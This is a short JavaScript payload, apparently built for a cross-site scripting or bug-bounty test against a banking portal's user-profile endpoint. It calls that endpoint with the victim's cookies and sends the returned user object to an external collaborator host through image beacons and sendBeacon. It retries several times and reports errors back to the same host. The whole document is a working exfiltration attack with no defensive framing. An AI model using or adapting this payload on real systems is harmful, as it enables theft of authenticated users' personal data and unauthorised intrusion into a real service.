(function() {
     console.log('[PAYLOAD STARTED]');

     const attackerServer = 'https://xjkooqyq4lzfsp991m48glnxlorffc31.oastify.com';

     (new Image()).src = attackerServer + '/ping?status=loaded';

     function callEndpoint() {
       fetch('https://uat.citivelocity.com/portal-profile-service/initNewPortalData', {
         method: 'GET',
         credentials: 'include',
         headers: {
           'Accept': 'application/json',
           'Content-Type': 'application/json'
         }
       })
       .then(response => response.json())
       .then(data => {
         const userObject = data.user;
         if (userObject) {
           const beacon = new Image();
           beacon.src = attackerServer + '/exfil?user=' + encodeURIComponent(JSON.stringify(userObject));

           if (navigator.sendBeacon) {
             navigator.sendBeacon(
               attackerServer + '/user',
               JSON.stringify(userObject)
             );
           }
         }
       })
       .catch(err => {
         (new Image()).src = attackerServer + '/error?msg=' + encodeURIComponent(err.message);
       });
     }

     callEndpoint();
     setTimeout(callEndpoint, 500);
     setTimeout(callEndpoint, 1500);

     if (document.readyState === 'loading') {
       document.addEventListener('DOMContentLoaded', callEndpoint);
     } else {
       window.addEventListener('load', callEndpoint);
     }
   })();
